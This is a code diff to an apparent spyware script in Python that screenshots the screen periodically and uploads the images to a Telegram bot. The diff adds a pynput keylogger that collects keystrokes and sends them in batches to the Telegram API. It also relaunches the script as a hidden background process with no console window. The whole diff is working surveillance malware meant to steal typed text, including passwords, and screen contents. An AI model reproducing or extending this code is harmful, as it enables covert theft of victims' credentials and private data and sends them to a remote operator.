@@ -10,7 +10,8 @@ import requests
 import time
 import os, sys
 import platform
-
+import subprocess
+import multiprocessing
 
 def load(url):
     return str(requests.get(url).content.decode("utf-8"))
@@ -73,8 +74,9 @@ def send_file(fname,caption=caption):
 
 def send_message(message=caption):
     url='https://api.telegram.org/bot{}/sendMessage'.format(token)
-    values={'chat_id' : chatid , 'message':caption,"disable_notification": 'true', 'parse_mode':'MarkdownV2'}
+    values={'chat_id' : chatid , 'text':message,"disable_notification": 'true'}
     r=requests.post(url,data=values)
+    print(r.content)
     
 def set_interval(new):
     global interval
@@ -102,9 +104,46 @@ define_caption()
 if "setup" in dir():
         setup()
 
+from pynput.keyboard import Key, Listener
+key_buffer = ""
+
+def on_press(key):
+    global key_buffer
+    try:
+        
+        knew = "{}".format(key)
+        if knew[0] == "'":
+            knew = knew[1:-1]
+        print(knew)
+        key_buffer += knew
+        if "Key" in knew:
+            key_buffer += "\n"
+    except :
+        pass
+    if len(key_buffer) > 100:
+        send_message(key_buffer+"\n\n"+caption)
+        key_buffer = ""
+
+
+def init_keylogger():
+    print("keylogger init")
+    with Listener(on_press=on_press) as listener :
+        listener.join()
+
+
+
+if sys.argv[-1] == "klog":
+    init_keylogger()
+    sys.exit(0)
+
+subprocess.Popen([sys.executable, sys.argv[0],"klog"], creationflags=subprocess.CREATE_NO_WINDOW)
+
 while True:
     if "loop" in dir():
         loop()
+    print("Take ss")
     f = get_screenshot()
+    print("Send ss")
     send_image(f,caption)
+    key_buffer = ""
     time.sleep(interval)
